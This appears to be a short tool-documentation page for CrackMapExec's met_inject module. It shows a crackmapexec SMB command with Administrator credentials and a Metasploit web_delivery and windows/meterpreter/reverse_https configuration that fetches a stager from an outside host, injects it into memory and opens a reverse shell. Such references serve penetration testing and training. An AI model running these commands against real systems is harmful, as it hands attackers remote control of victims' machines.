# ✅ met\_inject

Downloads the Meterpreter stager and injects it into memory

### Modules Options

```
crackmapexec smb $TARGET -u Administrator -p qwerty12345 -M met_inject --options
```

```
[*] met_inject module options:

SRVHOST     IP hosting of the stager server
SRVPORT     Stager port
RAND        Random string given by metasploit
SSL         Stager server use https or http (default: https)

```

### Get a Reverse Shell

#### Metasploit Web Delivery

```
use exploit/multi/script/web_delivery
set SRVHOST 10.211.55.6
set SRVPORT 8443
```

MetasploitReverse Shell

```
set payload windows/meterpreter/reverse_https
set LHOST 10.211.55.6
set LPORT 443
```
